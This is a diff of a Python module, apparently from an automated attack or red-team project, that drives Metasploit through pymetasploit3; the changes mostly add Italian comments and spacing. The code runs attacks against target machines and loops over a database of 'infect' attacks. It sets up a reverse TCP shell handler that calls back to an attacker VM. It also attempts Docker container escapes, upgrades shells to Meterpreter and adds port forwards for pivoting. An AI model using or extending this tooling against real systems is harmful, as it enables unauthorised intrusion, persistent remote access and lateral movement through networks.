@@ -1,6 +1,5 @@
 from pymetasploit3.msfrpc import MsfRpcClient
 from util import Logger
-
 from util import time_limit
 from client import MetasploitWrapper
 from time import sleep as delay
@@ -10,20 +9,19 @@ import subprocess
 
 class MetaClient:
     
-
+    #Viene creata un istanza di client Metasploit che si connette al server con password porta e ip specificati
     def __init__(self, c_password, c_port, c_ip):
-        # load database of machines
-        # load database of attacks
         self.output = ""
-
         self.client = MetasploitWrapper(c_password, port=c_port, server=c_ip)
         if self.client:
             Logger.log(self, f"client connected - {c_ip=}, {c_port=}", level=Logger.INFO)
         #self.bc_client=bc
     
-    
+
+    #Viene chiamato il metodo execute sull'attacco attack preso in input
+    #se ha successo viene restituito l'ip della macchina bersaglio compromessa un dizionazio con le info sulla nuova sessione creata 
     def attempt_attack(self,attack,backdoor_port=0):
-        sess= attack.execute()
+        sess = attack.execute()
         if not sess:
             return None
         compromised=sess["session_host"]
@@ -38,13 +36,15 @@ class MetaClient:
                     break
                 else:
                     Logger.log(self, f"can't establish connection with backdoor attempt {i} - {compromised=}", level=Logger.ERROR) """
-        return compromised,sess
+        return compromised, sess
     
+    #Viene chiamato il metodo scan sull'attacco scan_obj preso in input
     def attempt_scan(self,scan_obj):
         scan_obj.scan()
         return
     
-    def docker_escape(self,atk_sess):
+    #Vengono eseguiti massimo 5 tentativi di docker escape e se uno dei tentativi ha successo viene restituito un dizionario con la sessione creata
+    def docker_escape(self, atk_sess):
         sess={}
         for i in range (0,5):
             success =self.grab_docker_escape_conn()
@@ -59,6 +59,7 @@ class MetaClient:
 
     #questo metodo viene solo usato per il doker escape, per catturare la connessione che arriva una volta che un admin effettua una operazione di copia 
     #sulla macchina infetta, permettendo così di farci avere una connessione sulla macchina effettuando il docker_escape
+    #restituisce la nuova sessione creata se il docker-escape ha successo
     def grab_docker_escape_conn(self, payload="linux/x86/shell_reverse_tcp", sleep=True):
         """
         If a new session is created it returns the ip of the compromised machine, else it returns None.
@@ -72,7 +73,7 @@ class MetaClient:
         aus_client = self.client.client
         
         handler_p = aus_client.modules.use('payload', payload)
-        handler_p['LHOST'] = C.ATTACKER_VM     # attacker ip
+        handler_p['LHOST'] = C.ATTACKER_VM   # attacker ip
         handler_p['LPORT'] = C.NETCAT_PORT   # port defined in config file to connect to the netcat port used by docker_escape
 
         handler = aus_client.modules.use('exploit', 'multi/handler')
@@ -92,7 +93,9 @@ class MetaClient:
         else:
             Logger.log(self, f"unable to create netcat session", level=Logger.ERROR)
             return None
+        
 
+    #Itera sugli attacchi infect presenti nell'attack_db.json e li esegue in un sottoprocesso
     def infect(self):
         for atk in Attack_DB.infect_dict.keys():
             print(f"{C.COL_GREEN} Attacking with {atk}{C.COL_RESET}")
@@ -102,7 +105,10 @@ class MetaClient:
             #DEBUG
             #print(stdout)
     
-    def upgrade_shell(self, sess,sleep=True):
+
+    #Gestisce il processo di aggiornamento di una shell a una shell Meterpreter 
+    #restituisce l'ID della sessione Meterpreter se l'aggiornamento ha avuto successo
+    def upgrade_shell(self, sess, sleep=True):
         self.old_sessions = None
         self.new_sessions = None
         output=[]
@@ -140,13 +146,19 @@ class MetaClient:
             Logger.log(self, f"unable to create meterpreter shell session", level=Logger.ERROR)
             print(f"{C.COL_RED}[-] Meterpreter shell was not created with success, can't add the routes required...{C.COL_RESET}")
             return None   
+        
 
-    def prepare(self, router, atk_port,exposed_port, atk_ip):
+    #Prepara il comando e richiama il metodo add_portfwd della classe client 
+    def prepare(self, router, atk_port, atk_ip, exposed_port):
         cmd=C.ADD_PORTFWD.format(atk_ip,atk_port,exposed_port)
         #print(cmd)
         self.client.add_portfwd(router,cmd)
         return
     
+
+
+
+
 
 #NON UTILIZZATO
 class BackdoorCommander:
